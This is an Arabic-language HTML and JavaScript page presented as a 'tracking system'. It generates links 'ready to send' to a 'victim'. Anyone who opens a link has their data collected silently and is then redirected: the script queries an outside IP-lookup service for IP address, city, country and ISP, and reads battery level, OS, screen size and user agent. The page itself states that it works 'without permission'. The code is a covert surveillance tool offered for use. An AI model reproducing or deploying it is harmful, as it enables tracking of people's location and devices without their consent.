<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>نظام التتبع</title>
    <style>
        :root {
            --bg: #050505; /* أسود عميق */
            --card: #0d1117;
            --accent: #238636; /* أخضر تقني */
            --neon-blue: #58a6ff;
            --text: #c9d1d9;
            --dim: #8b949e;
        }

        body, html {
            margin: 0; padding: 0; width: 100%; height: 100%;
            background: var(--bg);
            font-family: 'Inter', 'Segoe UI', sans-serif;
            color: var(--text);
            overflow-x: hidden;
        }

        .container {
            display: flex; justify-content: center; align-items: center; min-height: 100vh;
        }

        /* لوحة التحكم */
        .admin-box {
            background: var(--card);
            padding: 40px;
            border-radius: 12px;
            width: 90%;
            max-width: 500px;
            box-shadow: 0 0 40px rgba(0,0,0,0.8);
            border: 1px solid #30363d;
            animation: slideUp 0.6s cubic-bezier(0.2, 0.8, 0.2, 1);
        }

        h2 { text-align: center; color: var(--neon-blue); margin-top: 0; font-size: 28px; letter-spacing: -1px; }

        input {
            width: 100%; padding: 16px; background: #010409; border: 1px solid #30363d;
            border-radius: 8px; color: #fff; margin-bottom: 20px; box-sizing: border-box;
            font-size: 15px; transition: 0.3s;
        }

        input:focus { border-color: var(--neon-blue); outline: none; box-shadow: 0 0 10px rgba(88,166,255,0.2); }

        .btn {
            background: #21262d; color: var(--neon-blue); border: 1px solid #30363d;
            padding: 16px; border-radius: 8px; cursor: pointer; width: 100%;
            font-weight: 800; font-size: 16px; transition: all 0.3s; text-transform: uppercase;
        }

        .btn:hover { background: var(--neon-blue); color: #fff; transform: translateY(-3px); }

        .result-area {
            margin-top: 25px; padding: 15px; background: #161b22;
            border-radius: 8px; border-left: 4px solid var(--neon-blue); animation: fadeIn 0.5s;
        }

        /* عرض البيانات المستلمة */
        #info-display { margin-top: 30px; display: none; animation: fadeIn 0.8s; }
        .info-card { 
            background: #0d1117; padding: 20px; border-radius: 8px; 
            border: 1px solid var(--accent); position: relative;
        }

        .info-item { display: flex; justify-content: space-between; padding: 10px 0; border-bottom: 1px solid #21262d; font-size: 14px; }
        .info-item b { color: var(--neon-blue); }
        .info-item span { color: #fff; text-align: left; }

        .pulse { 
            width: 10px; height: 10px; background: var(--accent); 
            border-radius: 50%; display: inline-block; margin-left: 8px;
            box-shadow: 0 0 10px var(--accent); animation: pulse 1.5s infinite;
        }

        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
        @keyframes slideUp { from { transform: translateY(30px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }

        .hidden { display: none !important; }
    </style>
</head>
<body>

<div class="container">
    <div id="admin-panel" class="admin-box">
        <h2>نظام التعقب</h2>
        <p style="text-align: center; color: var(--dim); font-size: 13px; margin-bottom: 30px;">سحب بيانات النظام، البطارية، والشبكة (بدون إذن)</p>
        
        <input type="text" id="urlInput" placeholder="أدخل الرابط المراد توجيه الضحية إليه">
        <button class="btn" onclick="generate()">توليد الرابط المشفر</button>

        <div id="result" class="result-area hidden">
            <p style="font-size: 11px; color: var(--dim); margin-bottom: 10px;">رابط التتبع (جاهز للإرسال):</p>
            <input type="text" id="finalLink" readonly onclick="this.select()" style="margin:0; background:#010409; border-color:var(--accent);">
        </div>

        <div id="info-display">
            <div class="info-card">
                <div style="margin-bottom: 15px;"><span class="pulse"></span> <b>بيانات الجهاز المكتشفة:</b></div>
                <div id="details"></div>
            </div>
        </div>
        <p id="waiting" style="text-align:center; color:var(--dim); font-size:12px; margin-top:20px;">الرابط خامل.. بانتظار الهدف</p>
    </div>
</div>

<script>
    const params = new URLSearchParams(window.location.search);
    const trackMode = params.get('t');

    // --- منطق الضحية (صامت تماماً) ---
    if (trackMode) {
        document.getElementById('admin-panel').innerHTML = "<h2 style='margin-top:20%'>جاري التحميل...</h2>";
        
        async function captureAndRedirect() {
            try {
                // 1. جلب بيانات الـ IP
                const ipRes = await fetch('https://ipapi.co/json/');
                const ipData = await ipRes.json();
                
                // 2. جلب البطارية
                const battery = await (navigator.getBattery ? navigator.getBattery() : Promise.resolve(null));
                
                const data = {
                    ip: ipData.ip || "غير متوفر",
                    city: ipData.city || "غير معروف",
                    country: ipData.country_name || "غير معروف",
                    org: ipData.org || "غير معروف",
                    os: navigator.platform,
                    battery: battery ? (battery.level * 100).toFixed(0) + "%" : "??",
                    screen: `${screen.width}x${screen.height}`,
                    time: new Date().toLocaleString('ar-EG'),
                    agent: navigator.userAgent
                };

                // حفظ البيانات
                localStorage.setItem('spy_data', JSON.stringify(data));

                // التحويل الفوري
                const redUrl = localStorage.getItem('red_url') || 'https://www.google.com';
                setTimeout(() => { window.location.href = redUrl; }, 100);
            } catch (e) {
                window.location.href = 'https://www.google.com';
            }
        }
        captureAndRedirect();
    }

    // --- منطق المدير ---
    function generate() {
        const url = document.getElementById('urlInput').value;
        if (!url) return;
        localStorage.setItem('red_url', url);
        const link = window.location.href.split('?')[0] + "?t=1";
        document.getElementById('finalLink').value = link;
        document.getElementById('result').classList.remove('hidden');
        document.getElementById('waiting').innerHTML = "الرابط نشط.. في انتظار الدخول <span class='pulse'></span>";
    }

    window.addEventListener('storage', (e) => {
        if (e.key === 'spy_data') {
            const d = JSON.parse(e.newValue);
            document.getElementById('info-display').style.display = 'block';
            document.getElementById('waiting').style.display = 'none';
            document.getElementById('details').innerHTML = `
                <div class="info-item"><b>IP Address:</b> <span>${d.ip}</span></div>
                <div class="info-item"><b>المكان:</b> <span>${d.city}, ${d.country}</span></div>
                <div class="info-item"><b>المزود:</b> <span>${d.org}</span></div>
                <div class="info-item"><b>النظام:</b> <span>${d.os}</span></div>
                <div class="info-item"><b>البطارية:</b> <span>${d.battery}</span></div>
                <div class="info-item"><b>الشاشة:</b> <span>${d.screen}</span></div>
                <div class="info-item"><b>التوقيت:</b> <span>${d.time}</span></div>
            `;
        }
    });
</script>

</body>
</html>
